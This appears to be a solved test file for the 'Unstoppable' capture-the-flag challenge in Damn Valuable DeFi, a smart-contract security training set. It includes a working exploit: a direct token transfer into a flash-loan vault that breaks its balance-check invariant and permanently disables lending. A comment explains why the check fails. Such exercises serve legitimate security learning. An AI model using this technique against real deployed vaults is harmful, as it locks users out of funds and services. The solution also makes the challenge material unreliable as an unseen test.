const { ethers } = require('hardhat');
const { expect } = require('chai');
const { BigNumber } = require('ethers');

describe('[Challenge] Unstoppable', function () {
    let deployer, player, someUser;
    let token, vault, receiverContract;

    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, player, someUser] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
            token.address,
            deployer.address, // owner
            deployer.address // fee recipient
        );
        expect(await vault.asset()).to.eq(token.address);

        await token.approve(vault.address, TOKENS_IN_VAULT);
        await vault.deposit(TOKENS_IN_VAULT, deployer.address);

        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
        expect(
            await vault.flashFee(token.address, TOKENS_IN_VAULT)
        ).to.eq(50000n * 10n ** 18n);

        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
            vault.address
        );

        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        /**
         * The problem is related with this code `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement`
         * totalSupply and balanceBefore(totalAssets()) all calcuate the ERC20 token's balance. 
         *    while totalAssets just get the balance by the ERC20 token's balanceOf() function,
         *    totalSupply is also get the balance of the  ERC20 token's balance, but it was calculated by the vault contract's itself. There are some missing to keep
         * track of the balance in the vault contract. Such as when other  address transfer the ERC20 token to valut, the vault contract doesn't keep track of the balance 
         * change though deposit, mint, burn funcitons keep track of the balance.
         * 
         * So, just send some ERC20 token by transfer function to vault contract, which will make  (convertToShares(totalSupply) != balanceBefore.
         *      
         */

        await  token.connect(player).transfer(vault.address,BigNumber.from(10000000));
        // let totalSupply =  await vault.totalSupply();
        // console.log(totalSupply);
        // //  let share =  await vault.convertToShares(vault.totalSupply());
        // //  console.log(share);
        //  let totalAssets =  await vault.totalAssets();
        //  console.log(totalAssets);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        await expect(
            receiverContract.executeFlashLoan(100n * 10n ** 18n)
        ).to.be.reverted;
    });
});
